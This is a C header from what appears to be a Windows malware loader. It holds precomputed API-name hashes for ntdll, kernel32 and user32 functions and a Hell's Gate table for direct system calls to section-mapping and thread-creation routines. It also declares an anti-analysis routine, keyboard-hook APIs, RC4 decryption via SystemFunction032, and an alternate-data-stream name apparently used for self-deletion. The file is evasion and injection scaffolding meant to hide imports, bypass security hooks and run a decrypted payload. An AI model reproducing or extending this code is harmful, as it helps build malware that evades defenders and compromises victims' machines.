#pragma once
#include <Windows.h>
#include "typedef.h"

// Seed of the HashStringJenkinsOneAtATime32BitA/W funtion in 'WinApi.c'
#define INITIAL_SEED	8

#define NEW_STREAM L":Mardcore"

#define NtCreateSection_JOAA    0x192C02CE
#define NtMapViewOfSection_JOAA         0x91436663
#define NtUnmapViewOfSection_JOAA       0x0A5B9402
#define NtClose_JOAA    0x369BD981
#define NtCreateThreadEx_JOAA   0x8EC0B84A
#define NtWaitForSingleObject_JOAA      0x6299AD3D
#define NtQuerySystemInformation_JOAA   0x7B9816D6
#define NtDelayExecution_JOAA   0xB947891A
#define CallNextHookEx_JOAA     0xB8B1ADC1
#define DefWindowProcW_JOAA     0xD96CEDDC
#define GetMessageW_JOAA        0xAD14A009
#define SetWindowsHookExW_JOAA  0x15580F7F
#define UnhookWindowsHookEx_JOAA        0x9D2856D0
#define GetModuleFileNameW_JOAA         0xAB3A6AA1
#define CloseHandle_JOAA        0x9E5456F2
#define CreateFileW_JOAA        0xADD132CA
#define GetTickCount64_JOAA     0x00BB616E
#define OpenProcess_JOAA        0xAF03507E
#define SetFileInformationByHandle_JOAA         0x6DF54277
#define CloseHandle_JOAA        0x9E5456F2
#define SystemFunction032_JOAA  0x8CFD40A8
#define KERNEL32DLL_JOAA       0xFD2AD9BD
#define USER32DLL_JOAA         0x349D72E7
#define NTDLLDLL_JOAA   0x0141C4EE
#define LdrLoadDll_JOAA         0xA22CF128

#define KEY_SIZE 16
#define HINT_BYTE 0x61

typedef struct _VX_TABLE_ENTRY {
	PVOID   pAddress;
	UINT32	uHash;
	WORD    wSystemCall;
} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;

typedef struct _VX_TABLE {

	VX_TABLE_ENTRY NtCreateSection;
	VX_TABLE_ENTRY NtMapViewOfSection;
	VX_TABLE_ENTRY NtUnmapViewOfSection;
	VX_TABLE_ENTRY NtClose;
	VX_TABLE_ENTRY NtCreateThreadEx;
	VX_TABLE_ENTRY NtWaitForSingleObject;
	VX_TABLE_ENTRY NtQuerySystemInformation;
	VX_TABLE_ENTRY NtDelayExecution;

} VX_TABLE, * PVX_TABLE;

typedef struct _API_HASHING {

	fnGetTickCount64                pGetTickCount64;
	fnOpenProcess                   pOpenProcess;
	fnCallNextHookEx                pCallNextHookEx;
	fnSetWindowsHookExW             pSetWindowsHookExW;
	fnGetMessageW                   pGetMessageW;
	fnDefWindowProcW                pDefWindowProcW;
	fnUnhookWindowsHookEx           pUnhookWindowsHookEx;
	fnGetModuleFileNameW            pGetModuleFileNameW;
	fnCreateFileW                   pCreateFileW;
	fnSetFileInformationByHandle    pSetFileInformationByHandle;
	fnCloseHandle                   pCloseHandle;

}API_HASHING, * PAPI_HASHING;

UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String);

#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))

// These are function prototypes - functions are defined in 'HellsGate.c'
PTEB RtlGetThreadEnvironmentBlock();
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory);
BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry);

// These are functions prototypes - functions are defined in 'HellAsm.asm'
extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();

BOOL AntiAnalysis(DWORD dwMilliSeconds);

HMODULE GetModuleHandleH(DWORD dwModuleHash);
FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiHash);
HMODULE LoadLibraryH(LPSTR DllName);